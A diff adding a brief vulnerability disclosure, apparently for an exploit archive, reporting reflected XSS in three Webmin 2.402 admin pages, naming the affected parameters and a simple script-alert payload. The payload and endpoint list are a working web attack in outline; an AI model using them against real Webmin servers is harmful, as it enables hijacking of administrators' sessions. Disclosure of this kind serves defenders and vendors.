@@ -1,0 +1,21 @@
+#Title : Multiple Reflected XSS in Webmin 2.402
+
+# Researcher: Aarya Dahal
+# vendor : https://webmin.com/
+# Version Affected : 2.402
+# Date 11 september 2025
+
+Proof of Concept
+
+1. Set up and installed Webmin 2.402 in a Linux testing environment.
+2. Reviewed and tested various URLs.
+3. Identified three specific URLs vulnerable to Reflected Cross-Site Scripting (XSS).
+ https://localhost:10000/apache/?xnavigation=1
+ https://localhost:10000/samba/edit_fshare.cgi?xnavigation=1
+ https://localhost:10000/samba/save_pshare.cgi?xnavigation=1
+4. Inserted payloads on the parameters 
+ Document Root
+ Share Name
+ Share Name
+5) the payload used jaVasCript: <script>alert(1)</script>
+6) the xss will execute on all the parameters
